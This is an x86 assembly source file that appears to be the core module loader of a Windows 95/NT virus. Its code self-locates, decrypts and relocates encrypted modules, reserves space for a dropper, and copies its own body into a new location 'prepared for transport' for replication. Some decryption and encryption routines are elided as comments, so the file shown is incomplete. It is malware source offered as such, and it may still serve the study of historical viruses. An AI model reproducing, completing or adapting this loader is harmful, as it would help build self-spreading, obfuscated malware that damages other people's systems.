.386p

; Allocation scheme
;
; ----------------
; main code & data     30kb
; and buffers
; ----------------
;  virtual disk        30kb (+ dropper)
;  area
; ----------------
;  decrypted src       20kb
; ----------------
;                      80kb
;

ACT_VXDRES = 0
ACT_NEWEXT = 1
ACT_DOS4GW = 2
ACT_PE     = 3

_codeseg   segment public USE32 'CODE' para
           assume cs:_codeseg, ds:_codeseg, es:_codeseg, ss:_codeseg

start:
             jmp  decrypt_first_module
very_next_label:
             align 8

include common.inc

shift          dd -1
opened         dd 0


; get module base
getbase:   call very_very_very_next
very_very_very_next:
           pop  ebp                              ; pop ptr to very_very_very_next
           sub  ebp, very_very_very_next - start ; compute total base
           ret

eX:        int 3
           int 4
           int 5
           int 6


decrypt_first_module:
           push  ebp                      ; save ebp
           call  getbase                  ; get loader base
           push  eax                      ; argument for decrypt mod

           ; full initialization
           mov   shift[ebp], -1
           mov   opened[ebp], 0
           mov   host_type[ebp], HOST_UNKNOWN
           mov   system[ebp], SYS_WIN95 or SYS_WINNT
           mov   subsystem[ebp], 0
           mov   std_W95_dir[ebp], offset cs:dirW95
           mov   std_WNT_dir[ebp], offset cs:dirWNT

           lea   eax, run_module[ebp]     ; set up ptr 2 module_loader
           mov   module_loader[ebp], eax  ; ...

           lea   eax, open_module[ebp]    ; set up ptr 2 open_module
           mov   module_open[ebp], eax    ; ...
           lea   eax, close_module[ebp]   ; set up ptr 2 close_module
           mov   module_close[ebp], eax   ; ...
           lea   eax, create_mirror[ebp]  ; set up ptr 2 create mirror
           mov   mirrorize[ebp], eax      ; ...

           pushad
           xor   ecx, ecx
           mov   initialize[ebp], 1

loop_init:
           push  ecx
           push  ecx
           call  run_module
           pop   ecx
           inc   ecx
           cmp   ecx, MODULES_CNT-2
           jb    loop_init

           popad

           mov   initialize[ebp], 0

           call  run_module               ; decrypt and run module

           pop   ebp                      ; restore ebp
           ret                            ; ...


; decode and relocate module
; regz destroyed
; eax = mod num
open_module:
           call  getbase              ; get body base


           mov   ebx, module_refs[4*eax+ebp]; get module base
           or    ebx, ebx
           jz    total_failed

           bts   opened[ebp], eax           ; set opened
           jc    just_opened                ; just opened


           ; decrypt ...
           ; ...
           ;


           mov   byte ptr relo_it[ebp], 01h ; set relo mode
           call  relocate_module            ; relocate both chains
           ret

just_opened:
           mov   edx, module_refs[4*eax+ebp]; get module base
           add   edx, ebp                   ; return ptr to start of module
           ret


; derelocate and encode module
; regz destroyed
; eax = mod num
close_module:
           call  getbase

           mov   byte ptr relo_it[ebp], 29h ; set unrelo mode
           mov   ebx, module_refs[4*eax+ebp]; get module base
           btr   opened[ebp], eax           ; set closed

           call  relocate_module            ; relocate both chains


           ; encrypt module
           ; ....
           ; ...
           ; .
           ;
           ret


;           movzx ebx, processing_ptr[ebp]
;           mov   processing[ebp+ebx], al
;           inc   processing_ptr[ebp]
ifdef DEBUG
;           cmp   processing_ptr, 16
;           jae   eX
endif

;           dec   processing_ptr[ebp]
;           movzx ebx, processing_ptr[ebp]
;           movzx eax, processing[ebp+ebx]   ; get argument from stack



run_module:
           push  eax                  ; this will be ptr to module num
           pushad
           ; find base
           call  getbase              ; get body base

           mov   eax, ss:[esp+28h]    ; get argument from stack

           call  open_module          ; open this module
           jc    failed               ; ???
           add  edx, 4                ; get ptr to first instruction
           mov  ss:[esp+20h], edx     ; store into stack

           popad                      ; restore regs

           call ss:[esp]              ; call to first instruction
           cmp  ss:[esp], 'OPEN'
           je   let_opened

           pushad
           ; find base
           call  getbase              ; get body base

           mov   eax, ss:[esp+28h]    ; get argument from stack

           call  close_module         ; close module

           popad

let_opened:
           add   esp, 4

           ret 4

failed:    popad
           add  esp, 4
           stc
           ret 4

total_failed:
           stc
           ret


; relocate module ebx = module base (not relocated)
relocate_module:
           mov  edx, ebp              ; first relocate common exports
           or   ebx, ebx              ; zero ? not present or nested !
           jz   total_failed          ; failed to run module

           add  ebx, ebp              ; get linear address of module
           mov  esi, ebx              ;
           add  esi, ds:[esi]         ; get ptr to last byte
           std                        ; don't forget relos are in reversed order
; relocating - phase 1
           add  ebx, shift[ebp]       ; -1 based
           push ebx                   ; save ebx
           call relocate              ; relocate first chain
           pop  ebx                   ; restore ebx (module base)

           mov  edx, module_refs[ebp+4*md_last]
           add  edx, ebp
           push ebx
           call relocate              ; relocate module chain
           pop  ebx

           mov  edx, ebx              ; edx = ptr to module
           sub  edx, shift[ebp]       ; because of -1 basing
           call relocate              ; relocate module chain

           cld                        ; standard direction
           clc
           ret

; perform relocation on relo chain ------------------------------------
relocate:
           xor  eax, eax
           lodsb                             ; get relo shift into al

           or   eax, eax                     ; if zero 2 byte shift
           jz   extended
relo_it:
           db   01h, 14h, 03h                ; 01 - add, 29 - sub
;           add  dword ptr ds:[ebx+eax], edx ; relocate it

           add  ebx, eax                     ; move reloptr
           jmp  relocate
extended:
           dec  esi
           lodsw                             ; get 2 byte shift
           inc  esi
           or   eax, eax
           jnz  relo_it                      ; relocate 2 byte shift
done:      ret


; input edi = ptr to mirrorize
create_mirror:
           call   getbase

           ; compute shift
           mov    eax, edi              ; compute dist between
           sub    eax, ebp              ; new position and base
           dec    eax                   ; -1 basing
           mov    shift[ebp], eax

           ; copy whole body
           mov    esi, ebp
           mov    ecx, body_len[ebp]
           add    ecx, 3
           shr    ecx, 2
           rep    movsd

           ; close opened modules
           xor    eax, eax

           push   opened[ebp]

next_module:
           bt     opened[ebp], eax
           jnc    skip_close

           pushad
           call   close_module
           popad

skip_close:
           inc    eax
           cmp    al, 32
           jb     next_module

           pop    opened[ebp]

           ; resume shift
           mov    shift[ebp], -1        ; resume shift

           ; now body in edi is prepared for transport
           clc
           ret



; done -------------------------------------------------------------------

_codeseg   ends

_stack     segment USE32 'STACK' STACK
_stack     ends

           end start

